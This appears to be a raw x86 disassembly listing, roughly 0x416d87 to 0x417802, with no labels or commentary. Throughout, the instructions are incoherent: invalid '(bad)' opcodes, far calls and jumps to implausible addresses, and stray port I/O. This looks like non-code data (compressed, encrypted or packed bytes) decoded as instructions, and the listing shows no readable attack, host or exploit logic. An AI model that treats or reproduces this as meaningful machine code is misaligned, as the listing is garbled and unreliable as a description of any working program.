  416d87:	add    BYTE PTR [ecx+eax*1],al
  416d8a:	add    BYTE PTR [eax],al
  416d8c:	outs   dx,DWORD PTR ds:[esi]
  416d8d:	xchg   DWORD PTR [esi-0x55d0ccef],eax
  416d93:	ins    DWORD PTR es:[edi],dx
  416d94:	add    al,0xef
  416d96:	out    dx,eax
  416d97:	sub    BYTE PTR [edx-0x71],ch
  416d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d9b:	pop    esi
  416d9c:	push   ecx
  416d9d:	(bad)  
  416d9f:	cmc    
  416da0:	xchg   esp,eax
  416da1:	pop    edi
  416da2:	popa   
  416da3:	lods   al,BYTE PTR ds:[esi]
  416da4:	jp     0x416d3e
  416da6:	xor    DWORD PTR [edx+0x631a7846],ecx
  416dac:	lds    ecx,FWORD PTR [edx+0x77]
  416daf:	mov    eax,0x71f05085
  416db4:	or     eax,0x64710c6
  416db9:	and    eax,0xc6d63a5e
  416dbe:	stc    
  416dbf:	movnti DWORD PTR [esi-0x40],edi
  416dc3:	stos   BYTE PTR es:[edi],al
  416dc4:	lods   al,BYTE PTR ds:[esi]
  416dc5:	push   edx
  416dc6:	sub    eax,0x2e2bff64
  416dcb:	jb     0x416ddb
  416dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dce:	jae    0x416e41
  416dd0:	sub    BYTE PTR [eax+0x7d],ah
  416dd3:	inc    esi
  416dd4:	dec    ecx
  416dd5:	adc    al,0xf3
  416dd7:	enter  0xaa4f,0x53
  416ddb:	enter  0x21d2,0xfc
  416ddf:	aaa    
  416de0:	xchg   ebp,eax
  416de1:	call   0x9ee0:0xe1099e21
  416de8:	add    eax,0xf3048a05
  416ded:	sbb    dl,ch
  416def:	enter  0xd6b3,0x15
  416df3:	pop    ebp
  416df4:	add    BYTE PTR ds:0xd4a1f982,bl
  416dfa:	out    0x97,eax
  416dfc:	pusha  
  416dfd:	xchg   ebp,eax
  416dfe:	mov    dh,0x5e
  416e00:	mov    ebp,0x2e6314a1
  416e05:	jnp    0x416dd9
  416e07:	fild   DWORD PTR [edi]
  416e09:	rol    al,cl
  416e0b:	add    DWORD PTR [esi],ebx
  416e0d:	inc    ebp
  416e0e:	jp     0x416e4e
  416e10:	out    0x56,eax
  416e12:	test   ah,ch
  416e14:	fs add eax,0x37d4d2f9
  416e1a:	ret    0xfac
  416e1d:	mov    al,0x56
  416e1f:	fld    TBYTE PTR [ebx+ecx*8-0x46a6ff9c]
  416e26:	jmp    0x96a1d5b3
  416e2b:	fmul   st(5),st
  416e2d:	cwde   
  416e2e:	std    
  416e2f:	add    DWORD PTR [esi-0x49],ecx
  416e32:	(bad)  
  416e33:	(bad)  
  416e34:	xlat   BYTE PTR ds:[ebx]
  416e36:	mov    esp,DWORD PTR [ebx-0x76]
  416e39:	std    
  416e3a:	jae    0x416e53
  416e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e3d:	mov    eax,0x1732517b
  416e42:	pop    esp
  416e43:	xchg   edx,eax
  416e44:	fwait
  416e45:	dec    ebx
  416e46:	mov    BYTE PTR [ecx+0x7e297598],bh
  416e4c:	in     al,0xc3
  416e4e:	mov    cl,0x34
  416e50:	inc    esp
  416e51:	into   
  416e52:	pop    esp
  416e53:	jns    0x416e2a
  416e55:	sub    bl,BYTE PTR [eax]
  416e57:	mov    al,ds:0x82164d1d
  416e5c:	lea    eax,[ecx-0x641f253]
  416e62:	mov    dl,0x63
  416e64:	add    bh,BYTE PTR [esi-0x59707f7a]
  416e6a:	clc    
  416e6b:	ds jno 0x416e8b
  416e6e:	push   esp
  416e6f:	and    bh,cl
  416e71:	jge    0x416e0a
  416e73:	jb     0x416dff
  416e75:	and    al,0xba
  416e77:	jmp    0x416ec9
  416e79:	inc    eax
  416e7a:	scas   al,BYTE PTR es:[edi]
  416e7b:	and    cl,bh
  416e7d:	inc    ebp
  416e7e:	dec    ebx
  416e80:	or     eax,0x8df79b78
  416e85:	aas    
  416e86:	mov    ch,0x78
  416e88:	(bad)  
  416e89:	lock mov eax,0xe353b2db
  416e8f:	jnp    0x416e91
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x34db8eea
  416f02:	in     al,0xf6
  416f04:	pop    esp
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	mov    bl,0xfc
  416f0e:	mov    dl,0x6
  416f10:	push   ebx
  416f11:	std    
  416f12:	and    eax,0xa962da59
  416f17:	lods   al,BYTE PTR ds:[esi]
  416f18:	mov    eax,ds:0xbab485cf
  416f1d:	xor    BYTE PTR [edx],ah
  416f1f:	sub    eax,0x599ad1d
  416f24:	fdivr  QWORD PTR [esi+0x52]
  416f27:	sbb    esi,ebx
  416f29:	mov    ah,0x25
  416f2b:	pop    edi
  416f2c:	adc    DWORD PTR [ebx],esp
  416f2e:	je     0x416fa6
  416f30:	cmp    eax,0x34c9bfe0
  416f35:	push   cs
  416f36:	jle    0x416f9b
  416f38:	lods   eax,DWORD PTR ds:[esi]
  416f3a:	or     eax,0x51e0d9c1
  416f3f:	push   eax
  416f40:	cmp    bh,ah
  416f42:	xchg   ebp,eax
  416f43:	jnp    0x416fa4
  416f45:	pop    esi
  416f46:	fwait
  416f47:	imul   edx,DWORD PTR [edi+0x29],0xe9b845e6
  416f4e:	aam    0x69
  416f50:	xor    DWORD PTR [edx-0x4d09528],eax
  416f56:	push   edi
  416f57:	jecxz  0x416fd7
  416f59:	not    DWORD PTR [ecx+ecx*4]
  416f5c:	les    esp,FWORD PTR [eax-0x52532bc4]
  416f62:	mov    bh,0xfe
  416f64:	repnz push ebp
  416f66:	add    al,0xdf
  416f68:	and    al,0xa3
  416f6a:	push   edi
  416f6b:	std    
  416f6c:	repz stc 
  416f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f6f:	cmp    BYTE PTR [edx],dh
  416f71:	push   ebx
  416f72:	xchg   ebx,eax
  416f73:	pop    ebx
  416f74:	ror    DWORD PTR [ebx+0x54],0x5b
  416f78:	imul   esi,DWORD PTR [ebp-0x55],0x2
  416f7c:	cmp    al,0x16
  416f7e:	das    
  416f7f:	add    al,0xc
  416f82:	sti    
  416f83:	sbb    bl,dh
  416f85:	scas   al,BYTE PTR es:[edi]
  416f86:	mov    bl,0xb2
  416f88:	adc    DWORD PTR [edx+esi*8],esi
  416f8b:	jg     0x416f21
  416f8d:	jl     0x416f11
  416f8f:	xchg   edi,eax
  416f90:	outs   dx,DWORD PTR ds:[esi]
  416f91:	pop    eax
  416f92:	jno    0x416f22
  416f94:	pop    ss
  416f95:	in     al,dx
  416f96:	stos   BYTE PTR es:[edi],al
  416f97:	mov    eax,0xc913a81a
  416f9c:	stc    
  416f9d:	dec    edi
  416f9e:	out    0xa6,al
  416fa0:	and    edi,DWORD PTR [ebx-0x31]
  416fa3:	mov    bh,0x53
  416fa5:	xchg   edx,eax
  416fa6:	jb     0x416ff0
  416fa8:	jecxz  0x416ff2
  416faa:	fnstsw WORD PTR [edx+eiz*4+0x40]
  416fae:	pop    ebx
  416faf:	mov    esi,0xe09caeb3
  416fb4:	sbb    cl,BYTE PTR [eax+0xe]
  416fb7:	dec    BYTE PTR [ebx-0x3be95128]
  416fbd:	mov    edi,0xf395881e
  416fc2:	dec    ebp
  416fc3:	sti    
  416fc4:	cmp    ch,BYTE PTR [ebx+0x36]
  416fc7:	xchg   DWORD PTR [ecx+0x55],esi
  416fca:	mov    ah,0x79
  416fcc:	mov    dh,0x36
  416fce:	xor    eax,0x7931b738
  416fd3:	retf   0x5041
  416fd6:	repnz xchg ecx,eax
  416fd8:	mov    eax,0x7110a260
  416fdd:	rcl    esp,0xb2
  416fe0:	cli    
  416fe1:	daa    
  416fe2:	push   ds
  416fe3:	loope  0x416fab
  416fe5:	cli    
  416fe6:	jg     0x416f72
  416fe8:	inc    edx
  416fe9:	inc    edx
  416fea:	jnp    0x416ffe
  416fec:	mov    dh,0xf
  416fee:	mov    esi,DWORD PTR [ebx-0x40a76ba4]
  416ff4:	pusha  
  416ff5:	jge    0x416fba
  416ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ff8:	lods   eax,DWORD PTR ds:[esi]
  416ff9:	pop    esi
  416ffa:	xchg   ecx,eax
  416ffb:	mov    cl,0xf4
  416ffd:	mov    ds:0xb351f973,al
  417002:	xchg   BYTE PTR [eax+0x66],dl
  417005:	dec    esp
  417006:	ret    0x230a
  417009:	pop    ecx
  41700a:	scas   al,BYTE PTR es:[edi]
  41700b:	xchg   ebx,eax
  41700c:	mov    WORD PTR [ebp+edx*1+0x48],gs
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    esi,DWORD PTR [esi+0x6e]
  417082:	xchg   BYTE PTR [edx+0x60],al
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	sahf   
  41708d:	pop    esi
  41708e:	jmp    0x41703a
  417090:	shl    DWORD PTR [eax+0x3d0a73d9],1
  417096:	std    
  417097:	or     al,0x2
  417099:	xchg   ecx,eax
  41709a:	and    eax,0xf550086a
  41709f:	push   ebp
  4170a0:	mov    ch,0x1f
  4170a2:	call   0xc2a3:0x9160bc70
  4170a9:	fwait
  4170aa:	mov    esi,0x722bdcc5
  4170af:	jbe    0x417126
  4170b1:	add    eax,0x4c78b63d
  4170b6:	mov    bh,0x16
  4170b8:	ins    DWORD PTR es:[edi],dx
  4170b9:	sub    ah,cl
  4170bb:	hlt    
  4170bc:	xchg   dh,ch
  4170be:	popa   
  4170bf:	mov    dh,0xca
  4170c1:	add    ebx,DWORD PTR [ebp-0x40]
  4170c4:	push   cs
  4170c5:	cmp    al,0xb2
  4170c7:	jle    0x4170b3
  4170c9:	inc    ebx
  4170ca:	jge    0x417089
  4170cc:	and    al,0xf5
  4170ce:	icebp  
  4170cf:	fdiv   QWORD PTR [ebp+0x6ba568cb]
  4170d5:	push   edx
  4170d6:	aam    0x72
  4170d8:	push   ss
  4170d9:	lahf   
  4170da:	in     eax,dx
  4170db:	push   0xffffff93
  4170dd:	xlat   BYTE PTR ds:[ebx]
  4170de:	pop    ecx
  4170df:	(bad)  
  4170e0:	dec    esi
  4170e1:	fwait
  4170e2:	inc    ecx
  4170e3:	sti    
  4170e4:	sub    ebp,DWORD PTR [edx+0x7cbd7408]
  4170ea:	and    al,0x67
  4170ec:	xchg   ebx,eax
  4170ed:	push   es
  4170ee:	lea    eax,ds:0xa7a60cd4
  4170f4:	stc    
  4170f5:	pusha  
  4170f6:	or     DWORD PTR [esi+0x1b82b075],esp
  4170fc:	scas   eax,DWORD PTR es:[edi]
  4170fd:	inc    edi
  4170fe:	outs   dx,DWORD PTR ds:[esi]
  4170ff:	(bad)  
  417100:	call   0x70dca2a2
  417105:	and    al,0xfe
  417107:	fild   QWORD PTR [ebx]
  417109:	popf   
  41710a:	jl     0x417148
  41710c:	sub    DWORD PTR [ecx-0x68],0xffffff94
  417110:	jmp    0x417186
  417112:	lds    esp,FWORD PTR ds:0x5a8b9e8
  417118:	push   ds
  417119:	xchg   DWORD PTR [ebx],ebx
  41711b:	cs clc 
  41711d:	xlat   BYTE PTR ds:[ebx]
  41711e:	sub    al,ch
  417120:	jae    0x417189
  417122:	dec    edx
  417123:	mov    edi,0x1d419692
  417128:	pop    edi
  417129:	je     0x417151
  41712b:	jle    0x417112
  41712d:	push   cs
  41712e:	inc    esp
  41712f:	or     DWORD PTR [ebx-0x49],0xa1bc2147
  417136:	ror    BYTE PTR [ebp+0x1c],cl
  417139:	fld    TBYTE PTR [eax+0x48]
  41713c:	lea    ebx,[edi]
  41713e:	dec    esi
  41713f:	test   eax,0x39542cd9
  417144:	mov    ebx,0x45679c7c
  417149:	mov    esp,0xf81d7644
  41714e:	fisubr DWORD PTR [edx-0x30153678]
  417154:	ret    0x7e69
  417157:	push   esi
  417158:	mov    ah,0x12
  41715a:	dec    edi
  41715b:	mov    ch,0xca
  41715d:	and    eax,0x3c1cf102
  417162:	lods   eax,DWORD PTR ds:[esi]
  417163:	mov    WORD PTR [esi],fs
  417165:	sbb    eax,DWORD PTR ds:0xfa9e1df6
  41716b:	and    cl,BYTE PTR [edi-0x3d6d25a3]
  417171:	test   bh,bh
  417173:	popf   
  417174:	lods   al,BYTE PTR ds:[esi]
  417175:	jmp    0x9a4a:0x329b3369
  41717c:	pop    ebx
  41717d:	dec    ebx
  41717e:	xlat   BYTE PTR ds:[ebx]
  41717f:	jae    0x417152
  417181:	repnz arpl WORD PTR [edi],ax
  417184:	(bad)  
  417185:	(bad)  
  417186:	and    DWORD PTR [eax],edi
  417188:	and    eax,0x1bcb98e4
  41718d:	xor    DWORD PTR [edx+0x26],edi
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	call   0x6538532c
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	cmp    al,0xdf
  41720e:	sbb    eax,0xd9b806cb
  417213:	fisub  WORD PTR [ebp+0x4]
  417216:	test   eax,0xf8162f4b
  41721b:	jge    0x4171aa
  41721d:	mov    al,0x71
  41721f:	cmp    edx,DWORD PTR [edi]
  417221:	sahf   
  417222:	xor    al,0x72
  417224:	dec    ecx
  417225:	jecxz  0x417278
  417227:	aad    0xb9
  417229:	mov    WORD PTR [ecx],ds
  41722b:	popf   
  41722c:	sbb    ebp,edx
  41722e:	ret    0xf453
  417231:	push   edi
  417232:	add    ebx,DWORD PTR [ebp-0x7b]
  417235:	sub    dl,BYTE PTR [ecx-0x6febcdbc]
  41723b:	rcr    DWORD PTR [edi+0x134ce4f2],0xb9
  417242:	cmp    edi,DWORD PTR [edx]
  417244:	(bad)  ds:0xe9280b07
  41724a:	call   0x2c3fb5f5
  41724f:	ror    DWORD PTR [ecx+0x54],1
  417252:	mov    ds:0xc89d946d,eax
  417257:	pushf  
  417258:	sub    eax,0x73d8d7c0
  41725d:	test   eax,0x58e663a
  417262:	xchg   BYTE PTR [ebp-0x3396a81e],dh
  417268:	mov    eax,ds:0xd0233dcc
  41726d:	push   es
  41726e:	pushf  
  41726f:	push   eax
  417270:	pop    ebp
  417271:	xlat   BYTE PTR ds:[ebx]
  417272:	mov    ebx,0xd1449892
  417277:	dec    eax
  417278:	sbb    BYTE PTR [edx+0x1bc34ca6],dh
  41727e:	dec    edi
  41727f:	loope  0x417208
  417281:	mov    ds:0xb3f1394b,eax
  417286:	repnz ss repnz cs ins DWORD PTR es:[edi],dx
  41728b:	inc    esi
  41728c:	sub    eax,0x5b9b07f4
  417291:	rcr    BYTE PTR [ecx+ebx*8-0x5ae53f0a],cl
  417298:	std    
  417299:	mov    esp,0x1701964f
  41729e:	mov    cl,0x1e
  4172a0:	adc    esi,DWORD PTR [ebx]
  4172a2:	aad    0x8a
  4172a4:	cld    
  4172a5:	mov    edi,0x656904fc
  4172aa:	faddp  st(5),st
  4172ac:	sbb    dl,ah
  4172ae:	push   esi
  4172af:	nop
  4172b0:	xor    BYTE PTR [eax+0x3],al
  4172b3:	and    al,0x84
  4172b5:	pop    ebx
  4172b6:	push   0xffffffa6
  4172b8:	push   ebx
  4172b9:	fnsave [eax]
  4172bb:	inc    edx
  4172bc:	retf   0x6c54
  4172bf:	sbb    eax,0xd54c73d6
  4172c4:	pop    ss
  4172c5:	inc    ecx
  4172c6:	mov    al,ds:0x99c38b84
  4172cb:	jle    0x4172da
  4172cd:	or     esi,ebp
  4172cf:	and    BYTE PTR [ebp-0x25],0x30
  4172d3:	xor    BYTE PTR ds:0x7aa0c33f,dl
  4172d9:	popf   
  4172da:	push   ebx
  4172db:	imul   ebx,ebx,0xcbd55715
  4172e1:	adc    esi,edx
  4172e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e4:	fldcw  WORD PTR [eax+0x2a]
  4172e7:	or     ch,BYTE PTR [ebx+0x2e]
  4172ea:	xchg   ebx,eax
  4172eb:	xlat   BYTE PTR ds:[ebx]
  4172ec:	outs   dx,DWORD PTR ds:[esi]
  4172ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ee:	mul    BYTE PTR [edi-0x77]
  4172f1:	(bad)  
  4172f2:	loopne 0x4172d3
  4172f4:	out    0x8d,al
  4172f6:	pop    ds
  4172f7:	xchg   DWORD PTR [ebp+0x4e3dbcb6],eax
  4172fd:	jge    0x4172d3
  4172ff:	ror    DWORD PTR [edi+0x15],1
  417302:	iret   
  417303:	hlt    
  417304:	les    ebx,FWORD PTR [esi-0x78]
  417307:	ins    BYTE PTR es:[edi],dx
  417308:	mov    BYTE PTR [ebp-0x496c7719],dh
  41730e:	retf   
  41730f:	sbb    eax,DWORD PTR [eax]
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	mov    eax,0x68471299
  417385:	cmc    
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	cmp    ecx,0x8e42ab15
  417392:	sbb    DWORD PTR [eax+0x4d],esi
  417395:	xor    ebx,DWORD PTR [eax-0xb]
  417398:	stc    
  417399:	fwait
  41739a:	out    0x4a,eax
  41739c:	sbb    al,0xfd
  41739e:	leave  
  41739f:	outs   dx,DWORD PTR ds:[esi]
  4173a0:	shl    BYTE PTR [ebp-0x5c],1
  4173a3:	lds    eax,FWORD PTR [eax]
  4173a5:	ss xchg ebx,eax
  4173a7:	mov    BYTE PTR [ecx],0xc2
  4173aa:	retf   0x640d
  4173ad:	mov    al,0xe8
  4173af:	jmp    0x4173f0
  4173b1:	jae    0x41737d
  4173b3:	lock jmp 0xdefc7612
  4173b9:	add    eax,0x97bac3a2
  4173be:	fdiv   DWORD PTR [ebp-0x9]
  4173c1:	call   0xf77993f6
  4173c6:	mov    ch,0xcc
  4173c8:	cdq    
  4173c9:	push   esp
  4173ca:	jno    0x417392
  4173cc:	xlat   BYTE PTR ds:[ebx]
  4173cd:	sahf   
  4173ce:	mov    ebp,0x321e31a3
  4173d3:	inc    ebp
  4173d4:	sub    eax,0x85b7e24a
  4173d9:	push   es
  4173da:	sti    
  4173db:	pop    ds
  4173dc:	mov    dh,BYTE PTR [eax+0x3b]
  4173df:	push   0x47038a37
  4173e4:	mov    dh,0xb5
  4173e6:	out    dx,eax
  4173e7:	jecxz  0x4173d7
  4173e9:	mov    al,ds:0x628e6d71
  4173ee:	or     al,0x6d
  4173f0:	mov    BYTE PTR ds:0x4927bb48,ch
  4173f6:	cmp    esi,DWORD PTR [edx]
  4173f8:	sbb    al,0xe1
  4173fa:	xor    eax,0x4c68f1b
  4173ff:	jns    0x4173ea
  417401:	lahf   
  417402:	lods   al,BYTE PTR ds:[esi]
  417403:	inc    ecx
  417404:	add    al,0x90
  417406:	sbb    al,cl
  417408:	pop    ss
  417409:	mov    eax,ds:0xa131a841
  41740e:	dec    edx
  41740f:	inc    eax
  417410:	jns    0x4173a2
  417412:	dec    esp
  417413:	jg     0x4173a3
  417415:	sub    esi,DWORD PTR [eax+0x3851b484]
  41741b:	mov    ebp,ebp
  41741d:	xchg   edi,eax
  41741e:	(bad)  
  41741f:	and    al,0x87
  417421:	add    DWORD PTR [edi],edi
  417423:	add    eax,0x80939f9a
  417428:	repnz pop eax
  41742a:	sbb    al,0xc8
  41742c:	pop    eax
  41742d:	(bad)  
  41742f:	and    al,0x1b
  417431:	xchg   ebx,eax
  417432:	or     eax,0xb5e2bcda
  417437:	lahf   
  417438:	dec    edi
  417439:	and    BYTE PTR [ebx+0x74],0xcd
  41743d:	jl     0x4173e4
  41743f:	add    esi,DWORD PTR [ebx-0x7a417d18]
  417445:	or     BYTE PTR [eax],dh
  417447:	test   al,0xb1
  417449:	sahf   
  41744a:	test   DWORD PTR [edx+0x404a165a],ebx
  417450:	xchg   esp,eax
  417451:	scas   al,BYTE PTR es:[edi]
  417452:	sbb    BYTE PTR [edi-0x1c0b2b0b],dh
  417458:	retf   0x6a2e
  41745b:	hlt    
  41745c:	into   
  41745d:	lds    edx,FWORD PTR [edi]
  41745f:	inc    esp
  417460:	xor    eax,0xbe3defa
  417465:	cmp    BYTE PTR [edx],dl
  417467:	push   ecx
  417468:	aad    0x72
  41746a:	sbb    ebp,edi
  41746c:	mov    eax,0xba3920fc
  417471:	jns    0x417478
  417473:	je     0x41748b
  417475:	xchg   edx,eax
  417476:	aas    
  417477:	and    al,0xa0
  41747a:	iret   
  41747b:	shr    BYTE PTR [esi+0x2214278d],cl
  417481:	div    BYTE PTR [eax+0x1b56c3a3]
  417487:	dec    ebp
  417488:	fild   DWORD PTR [eax-0x2b]
  41748b:	int    0x2b
  41748d:	mov    eax,ds:0xa16e
	...
  4174f2:	add    BYTE PTR [eax],al
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	sbb    bl,bh
  417502:	dec    eax
  417503:	mov    WORD PTR [esi+esi*8+0x0],gs
  417507:	add    BYTE PTR [ecx+eax*1],al
  41750a:	add    BYTE PTR [eax],al
  41750c:	lahf   
  41750d:	inc    esi
  41750e:	pop    edx
  41750f:	cdq    
  417510:	dec    ebx
  417511:	mov    edi,0x7f8264d7
  417516:	pusha  
  417517:	xchg   edx,eax
  417518:	stc    
  417519:	jbe    0x4174cf
  41751b:	sahf   
  41751c:	cwde   
  41751d:	inc    ebx
  41751e:	mov    bh,0x59
  417520:	into   
  417521:	call   0x3adf2da5
  417526:	js     0x417501
  417528:	mov    es,WORD PTR [ecx-0x483c5af9]
  41752e:	sbb    al,0x4d
  417530:	mov    esp,0x5d1a3e98
  417535:	push   0x80c6a214
  41753a:	test   al,0xf2
  41753c:	adc    bh,ah
  41753e:	pop    eax
  41753f:	mov    edi,DWORD PTR [esi-0x1d]
  417542:	jp     0x417577
  417544:	mov    dl,0xec
  417546:	lds    edi,FWORD PTR [ebx]
  417548:	retf   0x1acd
  41754b:	fwait
  41754c:	mov    ah,0x9f
  41754e:	push   cs
  41754f:	cmp    bh,ah
  417551:	dec    esp
  417552:	lods   al,BYTE PTR es:[esi]
  417554:	test   al,0xdb
  417556:	dec    esi
  417557:	or     esi,DWORD PTR [ebp+0x66]
  41755a:	jg     0x417537
  41755c:	movhlps xmm5,xmm2
  41755f:	in     eax,0x2c
  417561:	lock mov esi,0xe8146e37
  417567:	adc    DWORD PTR ds:0x15afa0e1,ebp
  41756d:	push   esp
  41756e:	fisttp DWORD PTR [ebx+0x30]
  417571:	inc    edx
  417572:	enter  0xf796,0x59
  417576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417577:	jmp    0x417526
  417579:	sahf   
  41757a:	sub    esi,DWORD PTR [esi]
  41757c:	leave  
  41757d:	sbb    dh,dh
  41757f:	inc    edi
  417580:	(bad)  
  417581:	repz sbb ah,ah
  417584:	fs jle 0x41753e
  417587:	out    0x51,al
  417589:	fnstenv [edx+0x703cba46]
  41758f:	push   0xffffffaa
  417591:	ja     0x417593
  417593:	arpl   WORD PTR [eax+0x16],bp
  417596:	loope  0x41754a
  417598:	sahf   
  417599:	mov    dh,0xf5
  41759b:	mov    eax,0x4570bd1f
  4175a0:	sti    
  4175a1:	stos   DWORD PTR es:[edi],eax
  4175a2:	sub    DWORD PTR [edx],0xa58c28cb
  4175a8:	and    eax,0xb5de923b
  4175ad:	fdivr  DWORD PTR ds:0x4c0abd2
  4175b3:	arpl   WORD PTR [ebx+0x75740a34],dx
  4175b9:	scas   eax,DWORD PTR es:[edi]
  4175ba:	ja     0x4175df
  4175bc:	or     DWORD PTR [esi-0x4c],ecx
  4175bf:	mov    al,ds:0xcad6fe17
  4175c4:	fnstenv [esi-0x22590679]
  4175ca:	pop    eax
  4175cb:	out    dx,al
  4175cc:	lods   eax,DWORD PTR ds:[si]
  4175ce:	sbb    BYTE PTR [ecx-0x114d0207],ch
  4175d4:	jb     0x4175ee
  4175d6:	cmp    ebx,esp
  4175d8:	sub    ch,BYTE PTR [edx-0x6e]
  4175db:	adc    BYTE PTR [ecx+0x42359b00],bh
  4175e1:	cs pop ebp
  4175e3:	pop    eax
  4175e4:	cmp    eax,DWORD PTR [esi+0x47]
  4175e7:	sub    DWORD PTR [ecx],ebx
  4175e9:	int3   
  4175ea:	pop    ebx
  4175eb:	shl    BYTE PTR [esi+0x1142277d],cl
  4175f1:	mov    BYTE PTR [ebp-0x39aebe06],dl
  4175f7:	jmp    0x4175ed
  4175f9:	inc    esi
  4175fa:	add    DWORD PTR [ebp+0x399292d7],eax
  417600:	adc    eax,0xec6d7d1
  417605:	and    dl,BYTE PTR [eax+0x1d]
  417608:	jnp    0x417659
  41760a:	(bad)  
  41760b:	push   eax
  41760c:	adc    ch,BYTE PTR [ecx+ecx*8-0x10]
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	(bad)  
  417681:	mov    ah,0x5b
  417683:	div    BYTE PTR [eax-0x9]
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	mov    al,0x56
  41768e:	test   BYTE PTR [eax],ah
  417690:	xor    BYTE PTR [ebx-0x61],al
  417693:	sub    DWORD PTR [edx-0x824cf15],ebx
  417699:	push   ecx
  41769a:	sti    
  41769b:	push   esp
  41769c:	in     eax,dx
  41769d:	xchg   edx,eax
  41769e:	xchg   ebp,eax
  41769f:	aas    
  4176a0:	clc    
  4176a1:	es loope 0x417651
  4176a4:	cld    
  4176a5:	dec    edi
  4176a6:	add    bh,0x83
  4176a9:	add    al,0x90
  4176ab:	jbe    0x41766b
  4176ad:	add    al,0xef
  4176af:	or     DWORD PTR [edi],edx
  4176b1:	mov    ecx,0xb6e47a6e
  4176b6:	cs mov al,0x35
  4176b9:	inc    ch
  4176bb:	cmp    al,0xfd
  4176bd:	pusha  
  4176be:	adc    DWORD PTR [eax],edx
  4176c0:	lds    edi,FWORD PTR [ebx-0x39]
  4176c3:	pop    es
  4176c4:	adc    edi,ecx
  4176c6:	fadd   st,st(6)
  4176c8:	add    DWORD PTR [ebp+0x73],esi
  4176cb:	gs adc eax,0x36bf247
  4176d1:	rcl    BYTE PTR [ebx+0x57],cl
  4176d4:	cmp    eax,0x382e5e80
  4176d9:	xchg   DWORD PTR [edi],esp
  4176db:	ds inc ebp
  4176dd:	call   0x526a8e38
  4176e2:	sub    dl,BYTE PTR [edx-0x2f]
  4176e5:	add    eax,0x26a07a0c
  4176ea:	inc    ecx
  4176eb:	sub    dl,BYTE PTR [edx+ebp*8-0x112c70d8]
  4176f2:	dec    esi
  4176f3:	push   esp
  4176f4:	inc    edx
  4176f5:	sbb    BYTE PTR [ecx+0xc62cf4b],bh
  4176fb:	call   0xcf423ed2
  417700:	mov    ecx,DWORD PTR [edi-0x7e7ac2e9]
  417706:	imul   edi,DWORD PTR [bx+0x39],0xffffffb6
  41770b:	lock rcl BYTE PTR [ebp+0x3867f3dd],cl
  417712:	aaa    
  417713:	das    
  417714:	jmp    0xe80b9703
  417719:	and    eax,0x45e7b818
  41771e:	ins    BYTE PTR es:[edi],dx
  41771f:	test   BYTE PTR ds:[eax+0x6b1b3546],cl
  417726:	enter  0xb5fd,0xc2
  41772a:	ret    
  41772b:	jmp    0xe8e738f6
  417730:	push   es
  417731:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  417733:	sub    eax,0x929ef618
  417738:	les    edi,FWORD PTR [eax+0x53]
  41773b:	adc    BYTE PTR [edx-0x1b],ah
  41773e:	dec    eax
  41773f:	push   edx
  417740:	pop    esp
  417741:	pushf  
  417742:	jne    0x417733
  417744:	pop    edx
  417745:	fdiv   st,st(7)
  417747:	adc    BYTE PTR [edi+0x5089a20],bl
  41774d:	adc    cl,dh
  41774f:	pop    es
  417750:	into   
  417751:	fcompp 
  417753:	and    BYTE PTR [edx+0x64],dl
  417756:	xchg   ebx,eax
  417757:	fstp   DWORD PTR [ecx]
  417759:	repz adc edi,DWORD PTR ss:[ebp-0x74]
  41775e:	sub    edi,DWORD PTR [ebp+0x6b]
  417761:	pushf  
  417762:	mov    eax,0xb0ecdfab
  417767:	sub    edi,edi
  417769:	std    
  41776a:	sbb    eax,0x53adb7aa
  41776f:	jmp    0x793d71fb
  417774:	adc    bh,BYTE PTR [ecx+0x51]
  417777:	sub    al,0xa2
  417779:	test   DWORD PTR [esi+0x161daa64],eax
  41777f:	mov    bh,0x49
  417781:	xchg   edi,eax
  417782:	mov    BYTE PTR [eax-0x72],dl
  417785:	retf   0xc915
  417788:	add    BYTE PTR [esi-0x10],bh
  41778b:	lods   al,BYTE PTR ds:[esi]
  41778c:	adc    bl,cl
  41778e:	mov    ch,0xf1
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	jb     0x417871
  417802:	nop
